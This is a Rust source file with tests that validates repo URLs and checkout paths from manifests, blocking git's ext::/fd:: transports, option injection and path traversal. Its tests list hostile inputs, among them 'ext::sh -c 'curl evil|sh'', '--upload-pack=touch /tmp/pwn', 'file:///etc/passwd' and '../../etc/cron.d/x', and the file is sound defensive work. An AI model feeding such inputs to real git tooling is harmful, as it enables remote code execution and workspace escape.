//! Input validation for values that reach `git` or the filesystem.
//!
//! Manifests and lockfiles are attacker-controllable inputs (they travel with
//! a repo). Two fields are dangerous if trusted blindly:
//!
//! * `url` — reaches `git clone` / `git ls-remote`. Git's "smart" transports
//!   (`ext::`, `fd::`) run arbitrary commands, and a `url` beginning with `-`
//!   is parsed by git as an option (`--upload-pack=…`), so a hostile manifest
//!   is remote code execution. We accept only a small allow-list of schemes.
//! * `path` — reaches `root.join(path)` for clone/checkout. `../../etc/…` or an
//!   absolute path escapes the workspace. We reject any non-relative or
//!   parent-escaping path.

use std::path::{Component, Path, PathBuf};

/// A rejected `url` or checkout `path`.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum SecurityError {
    #[error("repo url `{url}` is not allowed ({reason})")]
    DisallowedUrl { url: String, reason: String },
    #[error("checkout path `{path}` is not allowed ({reason})")]
    DisallowedPath { path: String, reason: String },
    #[error("checkout path `{path}` escapes the workspace root")]
    PathEscapesRoot { path: String },
}

/// Validate a repo clone URL against an allow-list of safe transports.
///
/// Accepts:
/// * `https://…`, `ssh://…`, `git://…`
/// * scp-like `user@host:path` (the shorthand `ssh` form)
///
/// * a local filesystem path (`/abs/path`, `./rel`, `../rel`, `~/path`) — a
///   supported clone source. On the git side the `file` protocol is gated to
///   direct user use only (never via submodule recursion).
///
/// Rejects everything else, in particular:
/// * a `url` beginning with `-` (git would treat it as an option, e.g.
///   `--upload-pack=…`).
/// * git "smart" transports that execute commands: `ext::`, `fd::`.
/// * the `file://` scheme and any transport helper spelled with the
///   `transport::address` form (`::`).
pub fn validate_repo_url(url: &str) -> Result<(), SecurityError> {
    let reject = |reason: &str| {
        Err(SecurityError::DisallowedUrl {
            url: url.to_string(),
            reason: reason.to_string(),
        })
    };

    let trimmed = url.trim();
    if trimmed.is_empty() {
        return reject("empty url");
    }
    // A leading '-' makes git parse the url as a command-line option.
    if trimmed.starts_with('-') {
        return reject("looks like a command-line option");
    }
    // Control characters (incl. newlines) never belong in a url.
    if trimmed.chars().any(|c| c.is_control()) {
        return reject("contains control characters");
    }

    // Local filesystem path: absolute, or an explicit relative/home form. Git
    // treats these as the `file` transport (gated on the git side). A bare
    // `foo/bar` is intentionally NOT accepted here to avoid ambiguity with
    // scp-like `host:path`; use `./foo/bar`.
    if trimmed.starts_with('/')
        || trimmed.starts_with("./")
        || trimmed.starts_with("../")
        || trimmed.starts_with('~')
    {
        return Ok(());
    }

    // Explicit URL scheme form: `scheme://…`.
    if let Some((scheme, _rest)) = trimmed.split_once("://") {
        return match scheme.to_ascii_lowercase().as_str() {
            "https" | "ssh" | "git" => Ok(()),
            other => reject(&format!("disallowed scheme `{other}://`")),
        };
    }

    // Transport-helper form: `transport::address` (e.g. `ext::`, `fd::`).
    // git only uses `::` (not part of a `://`) for remote helpers, all of
    // which we reject. This also catches `ext::sh -c '…'`.
    if trimmed.contains("::") {
        return reject("remote-helper transport (`transport::address`) is not allowed");
    }

    // scp-like shorthand: `user@host:path` or `host:path`. Require a `:` that
    // is not part of a scheme and comes after a plausible host. Disallow a
    // leading `:` (empty host).
    if let Some((host, _path)) = trimmed.split_once(':') {
        if host.is_empty() {
            return reject("empty host in scp-like url");
        }
        // A bare `host:path` with no `@` and no `.`/no `://` could also be a
        // Windows drive path, but on the git side we additionally pass `--`
        // and disable dangerous protocols, so accepting the scp form is safe.
        return Ok(());
    }

    reject("unrecognized url form (expected https/ssh/git scheme or user@host:path)")
}

/// Validate a repo/overlay checkout path: it must be workspace-relative and
/// must not escape via `..` or an absolute/root/prefix component.
///
/// Accepts `apps/mqtt`, `kernel`. Rejects `../x`, `/etc/x`, `a/../../b`,
/// `C:\x`, and any path containing a `..` component.
pub fn validate_checkout_path(path: &Path) -> Result<(), SecurityError> {
    let display = path.display().to_string();
    let reject = |reason: &str| {
        Err(SecurityError::DisallowedPath {
            path: display.clone(),
            reason: reason.to_string(),
        })
    };

    if path.as_os_str().is_empty() {
        return reject("empty path");
    }
    if path.is_absolute() {
        return reject("absolute paths are not allowed");
    }
    for component in path.components() {
        match component {
            Component::Normal(_) | Component::CurDir => {}
            Component::ParentDir => return reject("`..` components are not allowed"),
            Component::RootDir => return reject("root component is not allowed"),
            Component::Prefix(_) => return reject("drive/prefix component is not allowed"),
        }
    }
    Ok(())
}

/// Resolve `root.join(path)` and require the result to stay under `root`.
///
/// The checkout directory may not exist yet, so we cannot `canonicalize`; we
/// lexically normalize instead, rejecting any `..` component (defense in depth
/// on top of [`validate_checkout_path`]). Returns the normalized absolute path.
pub fn safe_checkout_join(root: &Path, path: &Path) -> Result<PathBuf, SecurityError> {
    validate_checkout_path(path)?;
    let mut normalized = root.to_path_buf();
    for component in path.components() {
        match component {
            Component::Normal(part) => normalized.push(part),
            Component::CurDir => {}
            // Already rejected by validate_checkout_path, but stay defensive.
            _ => {
                return Err(SecurityError::PathEscapesRoot {
                    path: path.display().to_string(),
                });
            }
        }
    }
    if !normalized.starts_with(root) {
        return Err(SecurityError::PathEscapesRoot {
            path: path.display().to_string(),
        });
    }
    Ok(normalized)
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;

    #[test]
    fn accepts_good_url_schemes() {
        for url in [
            "https://github.com/o/r.git",
            "HTTPS://github.com/o/r.git",
            "ssh://git@github.com/o/r.git",
            "git://example.com/o/r.git",
            "git@github.com:o/r.git",
            "user@host.example:path/to/repo.git",
        ] {
            assert!(validate_repo_url(url).is_ok(), "should accept {url}");
        }
    }

    #[test]
    fn rejects_ext_transport() {
        assert!(validate_repo_url("ext::sh -c 'curl evil|sh'").is_err());
        assert!(validate_repo_url("ext::sh -c x").is_err());
        assert!(validate_repo_url("fd::17/foo").is_err());
    }

    #[test]
    fn rejects_option_injection() {
        assert!(validate_repo_url("--upload-pack=touch /tmp/pwn").is_err());
        assert!(validate_repo_url("-x").is_err());
    }

    #[test]
    fn rejects_file_scheme_and_other_schemes() {
        assert!(validate_repo_url("file:///etc/passwd").is_err());
        assert!(validate_repo_url("ftp://example.com/x").is_err());
        assert!(validate_repo_url("http://insecure.example/x").is_err());
    }

    #[test]
    fn accepts_local_paths() {
        // Local git repos are a supported clone source (used by tests and
        // local mirror workflows). The `file` transport is gated on the git
        // side; option injection / remote-helper transports are still rejected.
        for p in [
            "/r/a",
            "/abs/path/repo.git",
            "./rel/repo",
            "../sibling",
            "~/repo",
        ] {
            assert!(validate_repo_url(p).is_ok(), "should accept {p}");
        }
    }

    #[test]
    fn rejects_empty_and_control_urls() {
        assert!(validate_repo_url("").is_err());
        assert!(validate_repo_url("   ").is_err());
        assert!(validate_repo_url("https://x\n/y").is_err());
    }

    #[test]
    fn accepts_good_checkout_paths() {
        for p in ["apps/mqtt", "kernel", "a/b/c"] {
            assert!(
                validate_checkout_path(Path::new(p)).is_ok(),
                "should accept {p}"
            );
        }
    }

    #[test]
    fn rejects_bad_checkout_paths() {
        for p in ["../x", "/etc/x", "a/../../b", "../../etc/cron.d/x"] {
            assert!(
                validate_checkout_path(Path::new(p)).is_err(),
                "should reject {p}"
            );
        }
    }

    #[test]
    fn safe_join_stays_under_root() {
        let root = Path::new("/ws");
        assert_eq!(
            safe_checkout_join(root, Path::new("apps/mqtt")).unwrap(),
            PathBuf::from("/ws/apps/mqtt")
        );
        assert!(safe_checkout_join(root, Path::new("../escape")).is_err());
        assert!(safe_checkout_join(root, Path::new("/etc/x")).is_err());
    }
}
